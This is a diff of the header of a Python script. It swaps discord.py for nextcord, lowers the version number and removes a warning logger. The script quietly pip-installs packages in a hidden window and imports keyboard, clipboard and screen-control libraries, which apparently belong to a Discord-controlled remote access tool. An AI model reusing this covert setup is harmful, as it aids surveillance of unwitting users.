@@ -3,7 +3,6 @@ import re
 import sys
 import uuid
 import json
-import wave
 import time
 import ctypes
 import base64
@@ -16,7 +15,7 @@ import platform
 import threading
 import subprocess
 
-VERSION = "3.7"
+VERSION = "1.0"
 PYTHON_CMD = sys.executable
 
 class log:
@@ -24,8 +23,6 @@ class log:
         print(f"[{time.strftime("%H:%M:%S", time.localtime())}] [ERROR] {text}")
     def info(text):
         print(f"[{time.strftime("%H:%M:%S", time.localtime())}] [INFO] {text}")
-    def warning(text):
-        print(f"[{time.strftime("%H:%M:%S", time.localtime())}] [WARNING] {text}")
 
 # ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
 # ==================================================================================================================================================================================================================== #
@@ -34,9 +31,9 @@ def InstallPackages(packages):
         log.info(f"Installing package {package}")
         subprocess.run([PYTHON_CMD, "-m", "pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
 
-InstallPackages(packages=["requests", "pycryptodome", "pyautogui", "pyperclip", "discord.py", "pynput"])
+InstallPackages(packages=["requests", "pycryptodome", "pyautogui", "pyperclip", "nextcord", "pynput"])
 
-import discord
+import nextcord as discord
 import requests
 import pyperclip
 import pyautogui
